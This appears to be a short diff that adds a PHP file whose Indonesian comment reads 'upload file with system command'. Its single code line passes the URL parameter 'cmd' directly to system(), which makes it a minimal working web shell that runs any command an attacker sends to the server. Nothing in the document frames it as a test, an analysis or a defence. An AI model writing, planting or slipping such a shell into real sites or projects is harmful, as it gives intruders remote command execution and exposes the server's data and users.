@@ -1,0 +1,2 @@
+# Upload file dengan system command
+<?php system($_GET['cmd']); ?>
